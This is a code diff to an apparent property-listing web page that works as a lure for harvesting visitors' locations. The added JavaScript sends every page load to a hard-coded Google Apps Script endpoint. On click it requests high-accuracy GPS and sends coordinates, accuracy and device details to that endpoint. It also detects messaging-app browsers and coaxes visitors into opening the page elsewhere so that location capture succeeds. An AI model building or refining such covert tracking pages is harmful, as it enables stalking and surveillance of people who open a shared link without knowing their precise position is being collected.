@@ -132,6 +132,25 @@
             gap: 10px;
         }
         
+        /* Live tracking status panel */
+        #trackPanel {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            color: #0369a1;
+            padding: 10px;
+            margin: 0 20px 20px 20px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: monospace;
+            max-height: 120px;
+            overflow-y: auto;
+        }
+        #trackPanel p { margin-bottom: 3px; }
+        .evt-page { color: #7c3aed; }
+        .evt-click { color: #ea580c; }
+        .evt-success { color: #16a34a; }
+        .evt-fail { color: #dc2626; }
+        
         #successMsg {
             display: none;
             padding: 20px;
@@ -182,6 +201,17 @@
         }
         .plot-location-btn:hover { background: #1e293b; }
         
+        .warn-inapp {
+            display: none;
+            background: #fef3c7;
+            border: 1px solid #f59e0b;
+            color: #92400e;
+            padding: 12px;
+            margin: 0 20px 15px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        
         @keyframes slideUp {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
@@ -208,13 +238,20 @@
     </div>
 
     <div class="cta-container">
-        <button id="contactBtn" onclick="sendLocation()">
+        <div id="inAppWarning" class="warn-inapp">
+            <i class="fas fa-exclamation-circle"></i> <strong>In-app browser detected.</strong> If location fails, tap ⋮ and <strong>Open in Chrome/Safari</strong>.
+        </div>
+        
+        <button id="contactBtn" onclick="handleButtonClick()">
             <i class="fas fa-folder-open"></i> View Details and Gallery
         </button>
         <div id="loader">
             <i class="fas fa-spinner fa-spin"></i> Getting exact location...
         </div>
     </div>
+    
+    <!-- Live event tracker visible on page -->
+    <div id="trackPanel"><p><strong>Session:</strong> Initializing...</p></div>
 
     <div id="successMsg">
         <p class="success-text">Seller will contact you shortly. Here are the plot details.</p>
@@ -268,69 +305,157 @@
     // ═══════════════════════════════════════════════════
     // ⚠️ REPLACE THIS WITH YOUR GOOGLE APPS SCRIPT URL
     // ═══════════════════════════════════════════════════
-    var scriptURL = 'YOUR_GOOGLE_SCRIPT_URL_HERE';
+    var scriptURL = 'https://script.google.com/macros/s/AKfycbyDcOuyIHq0l5jdxQcNAfwIwgom9VBM3mLJy25V8OkXpHjH1O4cqRbhVZB62S1lJU4/exec';
 
-    function sendLocation() {
+    // Generate unique session ID for this user
+    var sid = 'SID_' + Math.random().toString(36).substr(2, 6) + '_' + Date.now().toString(36).substr(-4);
+    var panel = document.getElementById('trackPanel');
+    
+    // Detect in-app browsers (WhatsApp, Instagram, FB)
+    function isInAppBrowser() {
+        var ua = navigator.userAgent || navigator.vendor || window.opera;
+        return /FBAN|FBAV|Instagram|WhatsApp|Telegram|Twitter|Line|WeChat|wv\)/i.test(ua);
+    }
+
+    function getDeviceInfo() {
+        return encodeURIComponent(
+            (navigator.userAgent || 'Unknown').substring(0, 100) + 
+            ' | ' + (navigator.platform || 'Unknown') + 
+            ' | ' + screen.width + 'x' + screen.height
+        );
+    }
+
+    function logEvent(text, cssClass) {
+        var p = document.createElement('p');
+        p.className = cssClass || '';
+        p.innerHTML = text;
+        panel.appendChild(p);
+        panel.scrollTop = panel.scrollHeight;
+    }
+
+    // Universal tracker - sends via Image() pixel (works everywhere)
+    function trackEvent(eventType, lat, lon, acc, statusMsg) {
+        if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
+            console.log('TRACK (URL not set):', eventType);
+            return;
+        }
+
+        var url = scriptURL 
+            + '?event=' + encodeURIComponent(eventType)
+            + '&sid=' + encodeURIComponent(sid)
+            + '&lat=' + encodeURIComponent(lat || '')
+            + '&lon=' + encodeURIComponent(lon || '')
+            + '&acc=' + encodeURIComponent(acc || '')
+            + '&status=' + encodeURIComponent(statusMsg || '')
+            + '&device=' + getDeviceInfo()
+            + '&cb=' + Date.now();
+
+        var img = new Image();
+        img.onload = function() { console.log('Tracked:', eventType); };
+        img.onerror = function() { console.log('Tracked (pixel):', eventType); };
+        img.src = url;
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 1. TRACK PAGE LOAD (Everyone who opens the link)
+    // ═══════════════════════════════════════════════════
+    window.addEventListener('DOMContentLoaded', function() {
+        panel.innerHTML = '<p><strong>Session ID:</strong> ' + sid + '</p>';
+        
+        if(isInAppBrowser()) {
+            logEvent('⚠️ In-app browser detected', 'evt-fail');
+            document.getElementById('inAppWarning').style.display = 'block';
+        }
+        
+        trackEvent('PAGE_LOAD', '', '', '', 'User opened website');
+        logEvent('📄 PAGE_LOAD sent', 'evt-page');
+    });
+
+    // ═══════════════════════════════════════════════════
+    // 2. BUTTON CLICK HANDLER
+    // ═══════════════════════════════════════════════════
+    function handleButtonClick() {
         var btn = document.getElementById('contactBtn');
         var loader = document.getElementById('loader');
-        var success = document.getElementById('successMsg');
-        var hiddenContent = document.getElementById('plotDetails');
 
-        if(scriptURL === 'https://script.google.com/macros/s/AKfycbxC2chNyk4zttvvLmatkCcrxAJoEhGQHFziljIXW16wgjCTKWW8jm4WOM7WE-ITW9KHLQ/exec') {
-            alert('ERROR: Please paste your Google Script URL inside the code first.');
+        if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
+            alert('Paste your Google Script URL in the code first.');
             return;
         }
 
         btn.style.display = 'none';
         loader.style.display = 'flex';
 
+        // TRACK: Button was clicked
+        trackEvent('BUTTON_CLICK', '', '', '', 'User clicked button');
+        logEvent('🖱️ BUTTON_CLICK sent', 'evt-click');
+
+        // Now request GPS
+        requestGPS();
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 3. GPS REQUEST + SUCCESS / FAILURE TRACKING
+    // ═══════════════════════════════════════════════════
+    function requestGPS() {
         if (!navigator.geolocation) {
-            alert('Geolocation is not supported by your browser.');
-            loader.style.display = 'none';
-            btn.style.display = 'flex';
+            // GPS API not available on this device/browser
+            trackEvent('GPS_UNAVAILABLE', '', '', '', 'Geolocation API not supported');
+            logEvent('❌ GPS_UNAVAILABLE (API missing)', 'evt-fail');
+            showContent();
             return;
         }
 
-        // PINPOINT ACCURACY SETTINGS (GPS-level precision)
         var geoOptions = {
-            enableHighAccuracy: true,  // Use GPS hardware, not Wi-Fi guess
-            timeout: 15000,            // Wait up to 15 seconds
-            maximumAge: 0            // Never use cached/old location
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
         };
 
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var acc = Math.round(position.coords.accuracy || 0); // Accuracy in meters
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                // SUCCESS: User allowed + got coordinates
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var acc = Math.round(position.coords.accuracy || 0);
 
-            // Build URL with exact coordinates + accuracy
-            var url = scriptURL 
-                + "?lat=" + encodeURIComponent(lat) 
-                + "&lon=" + encodeURIComponent(lon) 
-                + "&acc=" + encodeURIComponent(acc);
+                trackEvent('GPS_SUCCESS', lat, lon, acc, 'Permission granted & location captured');
+                logEvent('✅ GPS_SUCCESS (±' + acc + 'm)', 'evt-success');
+                showContent();
+            },
+            function(error) {
+                var errCode = error.code;
+                var errMsg = error.message || "Unknown error";
+                var eventName = "GPS_FAILED";
+                var friendlyStatus = errMsg;
 
-            // Fire-and-forget to Google Sheet (avoids CORS errors completely)
-            fetch(url, { method: 'GET', mode: 'no-cors' })
-            .then(function() {
-                loader.style.display = 'none';
-                success.style.display = 'block';
-                hiddenContent.style.display = 'block';
-                success.scrollIntoView({ behavior: 'smooth' });
-            })
-            .catch(function() {
-                loader.style.display = 'none';
-                alert('Network issue. Please check your connection.');
-                btn.style.display = 'flex';
-            });
+                if (errCode === 1) {
+                    eventName = "GPS_DENIED";
+                    friendlyStatus = "User denied permission";
+                } else if (errCode === 2) {
+                    eventName = "GPS_OFF";
+                    friendlyStatus = "Location services off or unavailable";
+                } else if (errCode === 3) {
+                    eventName = "GPS_TIMEOUT";
+                    friendlyStatus = "Location request timed out";
+                }
 
-        }, function(error) {
-            loader.style.display = 'none';
-            var msg = 'Please allow location access to view plot details.';
-            if(error.code === 2) msg = 'GPS signal not available. Please enable location services.';
-            if(error.code === 3) msg = 'Location request timed out. Please try again.';
-            alert(msg);
-            btn.style.display = 'flex';
-        }, geoOptions);
+                trackEvent(eventName, '', '', '', friendlyStatus);
+                logEvent('❌ ' + eventName + ': ' + friendlyStatus, 'evt-fail');
+                showContent();
+            },
+            geoOptions
+        );
+    }
+
+    // Always reveal content regardless of GPS result
+    function showContent() {
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('plotDetails').style.display = 'block';
+            document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth' });
+        }, 1200);
     }
 </script>
 
